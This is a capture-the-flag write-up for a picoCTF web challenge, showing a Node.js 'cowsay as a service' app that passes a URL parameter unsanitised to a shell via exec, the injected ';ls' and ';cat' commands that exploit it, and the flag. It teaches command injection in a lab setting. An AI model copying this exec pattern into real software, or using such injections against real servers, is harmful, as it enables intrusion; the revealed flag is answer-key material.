# Blame Game
Write-Up by **Mttttt** *2024-06-25*

## Task description

Now presenting [cowsay as a service](https://caas.mars.picoctf.net)

[index.js](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js)


- *Category*: **Web Exploitation**
- *Difficulty*: **Easy**

## Solution 

**index.js**:
```js
const express = require('express');  
const app = express();  
const { exec } = require('child_process');  
  
app.use(express.static('public'));  
  
app.get('/cowsay/:message', (req, res) => {  
 exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {  
   if (error) return res.status(500).end();  
   res.type('txt').send(stdout).end();  
 });  
});  
  
app.listen(3000, () => {  
 console.log('listening');  
});
```

This web app is just running **cowsay** command with text that specified in url

Backend looks like this:
```bash
cowsay hi
```

Lets try to manipulate this command and run another:
```bash
cowsay hi;ls
```

`https://caas.mars.picoctf.net/cowsay/hi;ls`
```
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

And now use command to see `falg.txt` content:

`https://caas.mars.picoctf.net/cowsay/hi;cat%20falg.txt`

### Answer

`picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
